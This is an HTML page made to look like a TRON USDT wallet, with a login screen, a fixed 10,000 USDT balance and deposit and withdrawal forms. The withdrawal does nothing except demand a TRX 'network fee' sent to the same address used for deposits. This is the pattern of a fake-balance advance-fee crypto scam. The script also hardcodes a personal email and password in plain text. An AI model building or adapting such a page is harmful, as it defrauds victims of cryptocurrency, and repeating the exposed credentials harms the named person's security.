# Mywallet
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON Wallet - Ardeshir Radmehr</title>
    <style>
        :root {
            --primary: #00ff88;
            --secondary: #7000ff;
            --danger: #ff006a;
            --background: #0a0a2e;
        }

        body {
            font-family: Arial, sans-serif;
            background: var(--background);
            color: white;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 25px;
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 50px rgba(112, 0, 255, 0.2);
        }

        .login-form, .wallet-section {
            display: none;
        }

        .active {
            display: block;
        }

        .balance {
            font-size: 3em;
            color: var(--primary);
            text-align: center;
            margin: 30px 0;
            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }

        .deposit-box, .withdraw-box {
            border: 2px solid var(--secondary);
            padding: 25px;
            border-radius: 15px;
            margin: 25px 0;
            background: rgba(112, 0, 255, 0.05);
        }

        input, button {
            width: 100%;
            padding: 15px;
            margin: 15px 0;
            border-radius: 12px;
            border: none;
            font-size: 1.1em;
        }

        button {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            cursor: pointer;
            transition: 0.3s;
            font-weight: bold;
        }

        button:hover {
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(112, 0, 255, 0.3);
        }

        .fee-notice {
            color: var(--danger);
            font-size: 0.9em;
            margin-top: 15px;
            text-align: center;
        }

        .trx-address {
            word-break: break-all;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <!-- Login Form -->
    <div class="container login-form active">
        <h2>🔐 Login to TRON Wallet</h2>
        <input type="email" id="loginEmail" placeholder="Email">
        <input type="password" id="loginPassword" placeholder="Password">
        <button onclick="login()">Login</button>
    </div>

    <!-- Wallet Interface -->
    <div class="container wallet-section">
        <button onclick="logout()" style="float: right;">🚪 Logout</button>
        
        <div class="balance">
            💰 Balance: 10,000 USDT
        </div>

        <!-- Deposit Section -->
        <div class="deposit-box">
            <h3>📥 Deposit USDT (TRC20 Network)</h3>
            <div class="trx-address" id="depositAddress">
                TVeyZpSJFYNZ8Kx5uuvZyZDfcXdEP9V6uX
            </div>
            <button onclick="copyAddress()">📋 Copy Address</button>
        </div>

        <!-- Withdrawal Section -->
        <div class="withdraw-box">
            <h3>📤 Withdraw USDT</h3>
            <input type="number" id="withdrawAmount" placeholder="Amount (USDT)">
            <input type="text" id="withdrawAddress" placeholder="Destination Address">
            <div class="fee-notice">
                ⚠️ Network Fee: 250 TRX per 1000 USDT
                <br>
                🔄 TRX Charge Address: TVeyZpSJFYNZ8Kx5uuvZyZDfcXdEP9V6uX
            </div>
            <button onclick="withdraw()">💸 Submit Withdrawal</button>
        </div>
    </div>

    <script>
        // Authentication Credentials
        const validCredentials = {
            email: "Ardeshirradmehr@gmail.com",
            password: "12998Ardeshir"
        };

        // Auth System
        function login() {
            const email = document.getElementById('loginEmail').value;
            const password = document.getElementById('loginPassword').value;

            if(email === validCredentials.email && password === validCredentials.password) {
                document.querySelector('.login-form').classList.remove('active');
                document.querySelector('.wallet-section').classList.add('active');
            } else {
                alert('❌ Invalid credentials!');
            }
        }

        function logout() {
            document.querySelector('.login-form').classList.add('active');
            document.querySelector('.wallet-section').classList.remove('active');
        }

        // Wallet Functions
        function copyAddress() {
            const textArea = document.createElement('textarea');
            textArea.value = document.getElementById('depositAddress').innerText;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            alert('✅ Address copied successfully!');
        }

        function withdraw() {
            const amount = parseFloat(document.getElementById("withdrawAmount").value);
            const address = document.getElementById("withdrawAddress").value.trim();
            
            if(!amount || amount <= 0 || !address) {
                alert('❌ Please fill all fields correctly!');
                return;
            }

            if(address.length !== 34 || !address.startsWith('T')) {
                alert('❌ Invalid TRON address!');
                return;
            }

            const fee = Math.ceil(amount / 1000) * 250;
            
            if(confirm(`⚠️ Are you sure you want to withdraw ${amount} USDT with ${fee} TRX network fee?`)) {
                alert('✅ Request submitted. Transaction will be processed after network confirmation.');
                document.getElementById("withdrawAmount").value = "";
                document.getElementById("withdrawAddress").value = "";
            }
        }
    </script>
</body>
</html>
